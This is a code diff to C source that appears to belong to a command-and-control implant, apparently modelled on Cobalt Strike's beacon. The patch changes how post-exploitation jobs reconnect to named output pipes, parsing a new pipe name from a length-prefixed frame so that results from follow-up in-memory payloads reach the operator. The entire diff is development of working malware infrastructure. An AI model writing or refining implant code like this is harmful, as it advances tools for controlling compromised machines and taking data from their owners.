@@ -554,14 +554,36 @@ void command_job_kill(char * buffer, int length) {
  * captured at spawn time from the postex args blob).  Reconnect and
  * track it as a fresh message-mode job so the follow-up BOF runs and
  * its chunks flow back through the normal psh_poll read loop. */
-static void kit_reconnect_out(psh_entry * ctrl) {
-	char * outname = strstr(ctrl->description, "|");
+static void kit_reconnect_out(psh_entry * ctrl, char * data, int dlen) {
+	char outname[64];
+	char * descname = strstr(ctrl->description, "|");
 	HANDLE out_h = INVALID_HANDLE_VALUE;
 	int x;
-	if (outname == NULL) {
+	int n = 0;
+	/* the follow-up frame is [BE32 len][pipe str][BE32 len][wire]; the
+	 * cna generates a NEW output pipe name per asyncx2 call, so the
+	 * name we must reconnect to is the one IN THE FRAME, not the one
+	 * captured at spawn time (kept as fallback). */
+	memset(outname, 0, sizeof(outname));
+	if (data != NULL && dlen > 8) {
+		int flen = ((unsigned char)data[0] << 24) |
+		           ((unsigned char)data[1] << 16) |
+		           ((unsigned char)data[2] << 8) |
+		            (unsigned char)data[3];
+		if (flen > 1 && flen < (int)sizeof(outname) && flen <= dlen - 4) {
+			for (x = 0; x < flen && x < 62; x++) {
+				if (data[4 + x] == 0) break;
+				outname[n++] = data[4 + x];
+			}
+			outname[n] = 0;
+		}
+	}
+	if (outname[0] == 0 && descname != NULL) {
+		_snprintf(outname, sizeof(outname), "%s", descname + 1);
+	}
+	if (outname[0] == 0) {
 		return;
 	}
-	outname++;
 	for (x = 0; x < 20; x++) {
 		if (connect_pipe(outname, &out_h)) {
 			pipe_track(out_h, ctrl->pid, CALLBACK_OUTPUT,
@@ -596,7 +618,7 @@ void command_job_data(char * buffer, int length) {
 				post_error_d(0x55, GetLastError());
 			}
 			else if (strstr(temp->description, "postex_ctrl") != NULL) {
-				kit_reconnect_out(temp);
+				kit_reconnect_out(temp, data, dlen);
 			}
 			return;
 		}
@@ -614,7 +636,7 @@ void command_job_data(char * buffer, int length) {
 				post_error_d(0x55, GetLastError());
 			}
 			else {
-				kit_reconnect_out(temp);
+				kit_reconnect_out(temp, data, dlen);
 			}
 			return;
 		}
